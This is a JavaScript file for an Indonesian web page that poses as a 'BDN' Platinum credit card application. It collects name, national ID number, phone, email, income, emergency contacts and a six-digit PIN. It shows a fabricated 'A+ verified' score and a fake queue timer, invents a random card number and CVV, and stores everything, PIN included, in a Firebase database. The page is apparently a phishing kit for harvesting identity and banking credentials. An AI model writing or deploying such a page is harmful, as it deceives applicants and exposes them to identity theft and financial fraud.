import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentStep = 1;
let isFlipLocked = false;

const inputNama = document.getElementById('inputNama');
const inputNIK = document.getElementById('inputNIK');
const inputWA = document.getElementById('inputWA');
const inputPW = document.getElementById('inputPW');

inputNama.addEventListener('input', (e) => {
    e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s]/g, "");
});

[inputNIK, inputWA, inputPW].forEach(el => {
    el.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, "");
    });
});

window.nextStep = (s) => {
    if (s > currentStep && !validateFields(currentStep)) return;
    currentStep = s;
    updateUI(s);
    if (s === 6) prosesAnalisisSistem();
};

window.prevStep = () => {
    if (currentStep > 1) {
        currentStep--;
        updateUI(currentStep);
        document.getElementById('btnSlik').style.display = "none";
        document.getElementById('errorActions').style.display = "none";
    }
};

function validateFields(step) {
    if (step === 1) {
        if (inputNama.value.length < 3) { alert("Nama lengkap minimal 3 huruf!"); return false; }
        if (inputNIK.value.length !== 16) { alert("NIK harus 16 digit angka!"); return false; }
    }
    if (step === 2) {
        if (inputWA.value.length < 11 || inputWA.value.length > 13) { alert("WhatsApp harus 11-13 digit!"); return false; }
        if (!document.getElementById('inputEmail').value.includes('@')) { alert("Email tidak valid!"); return false; }
    }
    if (step === 5 && inputPW.value.length !== 6) {
        alert("PIN harus 6 digit!"); return false;
    }
    return true;
}

function updateUI(s) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    document.getElementById(`step${s}`).classList.add('active');
    const percent = ((s - 1) / 7) * 100;
    document.getElementById('progressLine').style.width = percent + "%";
    document.querySelectorAll('.circle').forEach((c, i) => {
        c.classList.remove('active', 'completed');
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
        else { c.innerHTML = i + 1; }
    });
}

async function prosesAnalisisSistem() {
    const status = document.getElementById('slikStatus');
    const btnNext = document.getElementById('btnSlik');
    const errAct = document.getElementById('errorActions');
    status.innerHTML = "Mengecek integritas data...";
    const nikValue = inputNIK.value;

    try {
        const snapshot = await get(child(ref(db), 'nasabah'));
        if (snapshot.exists()) {
            const data = snapshot.val();
            for (let id in data) {
                if (data[id].nik === nikValue) {
                    status.innerHTML = `<b style="color:red">SKOR E: DITOLAK</b><br>NIK sudah terdaftar.`;
                    errAct.style.display = "block";
                    return;
                }
            }
        }
    } catch (e) { console.error("DB Error"); }

    setTimeout(() => {
        status.innerHTML = `<b style="color:#22c55e">SKOR A+: TERVERIFIKASI</b>`;
        btnNext.style.display = "flex";
    }, 2500);
}

window.generateFinal = async () => {
    if (!document.getElementById('checkAgree').checked) return alert("Harap centang persetujuan!");
    updateUI(8);
    initQueue();
};

function initQueue() {
    let timeLeft = 120;
    const interval = setInterval(() => {
        timeLeft--;
        document.getElementById('fillBar').style.width = ((120 - timeLeft) / 120 * 100) + "%";
        document.getElementById('timerDisplay').innerText = `Estimasi: ${timeLeft} Detik`;
        if (timeLeft <= 0) {
            clearInterval(interval);
            finalRevealProcess();
        }
    }, 1000);
}

async function finalRevealProcess() {
    document.getElementById('processingArea').style.display = 'none';
    document.getElementById('finalReveal').style.display = 'block';
    document.querySelector('.card-scene').classList.add('final-glow');

    const cardNoRaw = "001031" + Math.floor(Math.random() * 899999 + 100000) + "1785";
    const cardNoFormatted = cardNoRaw.match(/.{1,4}/g).join(" ");
    const cvvRandom = Math.floor(Math.random() * 899 + 100);
    
    document.getElementById('displayNo').innerText = cardNoFormatted;
    document.getElementById('displayName').innerText = inputNama.value;
    document.querySelector('.cvv-code').innerText = cvvRandom;

    const nasabahData = {
        activeVariant: "Platinum",
        cardStatus: "Active",
        email: document.getElementById('inputEmail').value,
        kontak_darurat: {
            nama_keluarga: document.querySelector('.em-name')?.value || "-",
            nomor_hp: document.querySelector('.em-phone')?.value || "-"
        },
        name: inputNama.value,
        nik: inputNIK.value,
        nomor_kartu: cardNoRaw, 
        pekerjaan: document.getElementById('jobType').value,
        pendapatan: document.getElementById('income').value,
        pin: inputPW.value,
        saldo: 1, 
        tgl_daftar: new Date().toISOString(),
        wa: inputWA.value
    };

    try {
        await set(ref(db, 'nasabah/' + cardNoRaw), nasabahData);
    } catch (e) { console.error("Sync Error"); }

    for(let i=1; i<=3; i++) {
        await new Promise(r => setTimeout(r, 600));
        document.getElementById(`rev${i}`).classList.add('show');
    }
}

window.toggleFlip = () => {
    if (isFlipLocked) { alert("Tunggu 5 detik..."); return; }
    const card = document.getElementById('cardInner');
    card.classList.toggle('is-flipped');
    if (navigator.vibrate) navigator.vibrate(25);

    isFlipLocked = true;
    const flipBtn = document.querySelector('.btn-flip');
    const originalText = flipBtn.innerText;
    let countdown = 5;
    const timer = setInterval(() => {
        countdown--;
        flipBtn.innerText = `🔄 (${countdown}s)`;
        if (countdown <= 0) {
            clearInterval(timer);
            isFlipLocked = false;
            flipBtn.innerText = originalText;
        }
    }, 1000);
};

window.takeScreenshot = () => {
    const area = document.getElementById('captureArea');
    const btn = document.getElementById('btnDownload');
    btn.innerText = "MENGUNDUH...";
    html2canvas(area, { scale: 3, useCORS: true }).then(canvas => {
        const link = document.createElement('a');
        link.download = `BDN-CARD-${inputNama.value}.png`;
        link.href = canvas.toDataURL();
        link.click();
        btn.innerText = "📸 SIMPAN GAMBAR KARTU";
    });
};
